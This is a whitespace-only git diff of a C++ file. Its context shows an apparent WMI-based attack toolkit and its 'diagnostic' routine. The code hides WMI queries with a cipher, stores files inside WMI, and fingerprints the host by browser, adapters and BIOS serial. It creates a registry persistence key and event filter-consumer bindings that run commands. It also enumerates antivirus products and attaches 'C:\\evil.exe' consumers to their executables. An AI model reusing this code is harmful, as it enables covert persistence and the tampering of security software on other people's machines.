@@ -37,7 +37,7 @@ class MiniWMI {
 public:
 	BOOL IReady;
 
-	MiniWMI(COMWrapper& com_wrapper, WMIConnection& wmi_connetion, Win32Interface& w32_wrapper,  
+	MiniWMI(COMWrapper& com_wrapper, WMIConnection& wmi_connetion, Win32Interface& w32_wrapper,
 		RegInterface& stdreg_wrapper, QueryInterface& query_interface) :
 		IReady(FALSE), COM(com_wrapper), WMI(wmi_connetion), IWin32(w32_wrapper), IReg(stdreg_wrapper),
 		IQuery(query_interface)
@@ -45,7 +45,7 @@ public:
 		if (COM.IReady && WMI.IReady && IWin32.IReady && IReg.IReady && IQuery.IReady)
 			IReady = TRUE;
 	}
-	
+
 	HRESULT EnumNetworkAdapters(
 		_In_ std::wstring sFilter,
 		_Out_	 std::vector<std::wstring>& vsSignatures
@@ -65,7 +65,7 @@ public:
 		std::wstring sQueryAllW;
 		ciph.decipher(5, L"S noe tKE*Fi3wrtrEMcuIEL RW2tkp RaarL ETO _eAaWEnfe CMNdHur", sQueryLikeW);
 		ciph.decipher(5, L"S noeE*Fi3wrtrL RW2tkpETO _eAaCMNd", sQueryAllW);
-		
+
 		// Execute query
 		if(!sFilter.empty())
 			hres = IQuery.Query(sQueryLikeW + L"\"%" + sFilter + L"%\"", vOut);
@@ -77,7 +77,7 @@ public:
 			ILog("ExecQuery failed with error code 0x%08X\n", hres);
 			return hres;
 		}
-		
+
 		// Check the map for results
 		if(!vOut.empty())
 			for (auto& map : vOut)
@@ -125,25 +125,25 @@ public:
 	{
 
 		Railfence ciph;
-		
+
 		/* SELECT * FROM Win32_BIOS WHERE SerialNumber LIKE "%sFilter%" */
 		// Declarations
 		HRESULT hres = NULL;
 		std::vector < std::map <std::wstring, std::any> > vOut;
-		
+
 		std::wstring sQueryLikeW;
 		std::wstring sQueryAllW;
-		
+
 		// Decode sQueryLike and sQueryAll
 		ciph.decipher(5, L"S n eb E*Fi3SWSrmeEL RW2OH iurKETO _IEEaN ICMBRlL" L"\"%" + sFilter + L"%\"", sQueryLikeW);
 		ciph.decipher(5, L"S nE*Fi3SL RW2OETO _ICMB", sQueryAllW);
-		
+
 		// Execute query
 		if(!sFilter.empty())
 			hres = IQuery.Query(sQueryLikeW + L" \"%" + sFilter + L"%\"", vOut);
 		else
 			hres = IQuery.Query(sQueryAllW, vOut);
-		
+
 		if (FAILED(hres))
 		{
 			ILog("ExecQuery failed with error code 0x%08X\n", hres);
@@ -205,11 +205,11 @@ public:
 
 		return hres;
 	}
-	
+
 	// Map structure:
-	// SubkeyName : < SubKeyValue : SubKeyType > 
+	// SubkeyName : < SubKeyValue : SubKeyType >
 	HRESULT EnumSubKeysAndValues(
-		_In_ LONG hRootKey, 
+		_In_ LONG hRootKey,
 		_In_ std::wstring sKey,
 		_Out_ std::map<std::wstring, std::map<std::wstring, INT32>>& mValues)
 	{
@@ -217,7 +217,7 @@ public:
 
 		IReg.EnumValue(hRootKey, sKey, mSubValues);
 		HRESULT hres = NULL;
-		
+
 		if (!mSubValues.empty())
 		{
 			for (auto& subvalue : mSubValues)
@@ -252,7 +252,7 @@ public:
 
 		// Initialize vector of maps
 		std::vector < std::map < std::wstring, std::any> > vProcessList;
-		
+
 		// Build query
 		std::wstring sQueryFilterW;
 		ciph.decipher(5, L"S neEIE*Fi3csR LKL RW2osEN EETO _r Hae CMPWm", sQueryFilterW);
@@ -284,12 +284,12 @@ public:
 		}
 
 		return hres;
-		
+
 	}
 
 	HRESULT EnumSubKeys(
-		_In_ LONG hRootKey, 
-		_In_ std::wstring sKey, 
+		_In_ LONG hRootKey,
+		_In_ std::wstring sKey,
 		_Out_ std::vector<std::wstring>& vSubKeys)
 	{
 		HRESULT hres = IReg.EnumKey(hRootKey, sKey, vSubKeys);
@@ -323,15 +323,15 @@ void AddResult(std::wstring test, HRESULT hres)
 
 int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 
-	// Create event, consumer and binding 
+	// Create event, consumer and binding
 	HRESULT hres = NULL;
 	Railfence ciph;
 	ClassFactory IClassFactory(ICom, WMI);
 	WMIFSInterface IWMIFS(ICom, WMI, IClassFactory);
-	
+
 	// Create new root drive
 	IWMIFS.CreateDrive(L"WMIFSTest", NULL);
-	
+
 	// Copy file to buffer
 	std::string filePath = "C:\\GOG Games\\DOOM\\unins000.dat";
 	//FILE* fh = fopen(filePath.c_str(), "rb");
@@ -353,11 +353,11 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 	//// convert buffer to wstring
 	std::wstring fileContents;
 	ciph.FileToBase64UTF16(filePath, fileContents);
-	
+
 
 	ILog("File length is %d\n", fileContents.length());
 	// Write the file
-	
+
 	try {
 		hres = IWMIFS.WriteFile(L"WMIFSTest", L"NASA Ultron lives here 8-)", fileContents);
 	}
@@ -367,7 +367,7 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 	}
 
 	AddResult(L"WMIFS Write File", hres);
-	
+
 	// Read the file
 	std::wstring fileContentsRead;
 	hres = IWMIFS.ReadFile(L"WMIFSTest", L"NASA Ultron lives here 8-)", fileContentsRead);
@@ -382,7 +382,7 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 	{
 		ILog("File contents do not match\n");
 	}
-	
+
 	// Print the lengths
 	ILog("File wrote length: %d\n", fileContents.size() * sizeof(wchar_t));
 	ILog("File read length:  %d\n", fileContentsRead.size() * sizeof(wchar_t));
@@ -394,9 +394,9 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 	}
 	else
 		AddResult(L"File Length Check", S_OK);
-		
+
 	ILog("Byte difference:   %d\n", fileContents.size() - fileContentsRead.size());
-		
+
 	// Print byte difference
 	HRESULT hrIntegrityOK = S_OK;
 	for (int i = 0; i < fileContents.size(); i++)
@@ -409,20 +409,20 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 		}
 	}
 	AddResult(L"File Integrity Check", hrIntegrityOK);
-		
+
 	// Print the last 200 bytes
 	ILog("Last 20 bytes:\n");
 	ILog("  File wrote:    %ls\n", fileContents.substr(fileContents.length() - 20).c_str());
 	ILog("  File read:     %ls\n", fileContentsRead.substr(fileContentsRead.length() - 20).c_str());
-	
-	
+
+
 	// Write the file
 	std::string outPath = "C:\\GOG Games\\DOOM\\unins001.dat";
 	ciph.Base64UTF16ToFile(fileContentsRead, outPath);
 
 	fileContentsRead.clear();
-	
-	
+
+
 
 	ILog("\n\n WMI Diagnostics --------------------------------------------- \n\n");
 	Win32Interface process(ICom, WMI);
@@ -432,13 +432,13 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 
 	RegInterface stdReg(ICom, WMI);
 	QueryInterface IQuery(ICom, WMI);
-	
+
 	MiniWMI miniWMI(ICom, WMI, process, stdReg, IQuery);
-	
+
 	std::vector<std::wstring> subKeys;
 
 	StringTable st;
-	
+
 	ILog("Finding web browser\n");
 	//SELECT * FROM Win32_Process WHERE Name LIKE "%chrome%"
 	std::vector<long> processIds;
@@ -456,7 +456,7 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 	}
 
 	ILog("Finding network adapters\n");
-	
+
 	std::vector<std::wstring> vsSignatures;
 	hres = miniWMI.EnumNetworkAdapters(L"", vsSignatures);
 	if (SUCCEEDED(hres))
@@ -486,10 +486,10 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 	{
 		ILog("Failed to find BIOS serials: %d\n", hres);
 	}
-	
+
 
 	ILog("\n\n1. Creating Persistence Key ---------------------------------- \n\n");
-	
+
 	hres = stdReg.CreateKey(WMI_HIVE_LONG, st.GetRegistryKey());
 	if (SUCCEEDED(hres))
 	{
@@ -507,9 +507,9 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 	}
 
 	AddResult(L"Create Persistence Key", hres);
-	
+
 	ILog("\n\n2. Creating filter binder ------------------------------------  \n\n");
-	
+
 	RegistryBindingFast IFilterBinder(ICom, WMI);
 
 	std::wstring sCommandLine = st.GetScript() + L"evil"; // L"powershell.exe - Command Set - ItemProperty REGISTRY::HKEY_USERS\\" + subKeys.at(0) + L"\\Software\\MyKey - Name Test - Value Test3";
@@ -519,11 +519,11 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 		WMI_CONSUMER_NAME, // Consumer name
 		sFilterQuery,  // Filter query
 		sCommandLine); // Consumer command
-	
+
 	std::wcout << "Used " << sFilterQuery << std::endl;
 	std::wcout << sCommandLine << std::endl;
 	st.DestroyScript();
-	
+
 	if (SUCCEEDED(hres))
 	{
 		ILog("PASS\n");
@@ -532,7 +532,7 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 	{
 		ILog("\n\nFAIL\n");
 	}
-    
+
 	AddResult(L"Registry Binder", hres);
 
 	ILog("\n\n3. Enumerating RUN keys -------------------------------------- \n\n");
@@ -560,7 +560,7 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 		hres = stdReg.SetStringValue(WMI_HIVE_LONG, st.GetRegistryKey(), L"Ultron", L"evil");
 		st.DestroyRegistryKey();
 	}
-    
+
 	if (SUCCEEDED(hres))
 		ILog("\n\nPASS\n");
 	else
@@ -572,9 +572,9 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 	//std::vector<std::wstring> vValues;
 
  //   std::map<std::wstring, INT32> mValues;
- //   
+ //
 	//stdReg.EnumValue(WMI_HIVE_LONG, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", mValues);
- //   
+ //
 	//if (!mValues.empty())
 	//{
 	//	for (auto& value : mValues)
@@ -610,7 +610,7 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 	//				std::wcout << L"Unknown: " << value.second << std::endl;
 	//				break;
  //           }
- //           
+ //
 	//	}
 	//}
 
@@ -624,18 +624,18 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 		st.DestroyRegistryValueName();
 		ILog("\n\nPASS\n");
 		hres = S_OK;
-		
+
 	}
 	else
 	{
 		ILog("\n\nFAIL\n");
 		hres = E_FAIL;
 	}
-	
+
 	AddResult(L"Find TEST Key", hres);
-	
+
 	ILog("\n\n6. Creating notepad.exe -------------------------------------- \n\n");
-	
+
 	process.Create(L"notepad.exe", NULL, NULL, &ProcessId, &ReturnValue);
 
     // Print return value & process ID
@@ -652,12 +652,12 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 		AddResult(L"Create Notepad", E_FAIL);
 		ILog("\n\nFAIL\n");
 	}
-	
+
 	ILog("\n\n7. Enumerating antivirus products ---------------------------- \n\n");
 
 	AVProduct avProduct;
 	std::vector<AVProduct> vAVProducts;
-	
+
 	HRESULT bAv = IQuery.QueryAntivirusProducts(vAVProducts);
     if(SUCCEEDED(bAv))
         for (auto& av : vAVProducts)
@@ -676,10 +676,10 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 
 			std::wstring sPathReporter = L"C:\\evil.exe " + av.pathSignedExe;
 			std::wstring sPathSigner = L"C:\\evil.exe " + av.pathReportingExe;
-			
+
 			std::wstring sSignConsumerName = remove_extension(base_name(av.pathSignedExe));
 			std::wstring sSignFilterName = remove_extension(base_name(av.pathSignedExe));
-			
+
 			std::wstring sReportConsumerName = remove_extension(base_name(av.pathReportingExe));
 			std::wstring sReportFilterName = remove_extension(base_name(av.pathReportingExe));
 
@@ -687,7 +687,7 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 				sSignConsumerName += L"_Consumer";
 			if (!sSignFilterName.empty())
 				sSignFilterName += L"_Filter";
-			
+
 			if (!sReportConsumerName.empty())
 				sReportConsumerName += L"_Consumer";
 			if (!sReportFilterName.empty())
@@ -698,8 +698,8 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 			std::wcout << L"Signer Filter: " << sSignFilterName << std::endl;
 			std::wcout << L"Reporter Consumer: " << sReportConsumerName << std::endl;
 			std::wcout << L"Reporter Filter: " << sReportFilterName << std::endl;
-			
-			
+
+
 			BindingInterface IBindSign(ICom, WMI);
 			BindingInterface IBindReport(ICom, WMI);
 
@@ -761,7 +761,7 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 				AddResult(L"CreateEventFilter", E_FAIL);
 				AddResult(L"BindEventFilterAndConsumer", E_FAIL);
 			}
-            
+
         }
 	else
 	{
@@ -773,11 +773,11 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 
 
 
-	
+
 	ILog("\n\n-- End of diagnostic -------------------------------------- \n\n\n");
-	
+
 	// Diagnostic summary
-	
+
 	ILog("-- Diagnostic Summary --------------------------------------\n\n");
 	for (auto& result : diagnosticResults)
 	{
@@ -787,8 +787,8 @@ int WMIDiagnostic(COMWrapper& ICom, WMIConnection& WMI) {
 		else
 			ILog("FAIL\n");
 	}
-	
+
 	ILog("\n\n");
-	
+
     return 0;
 }
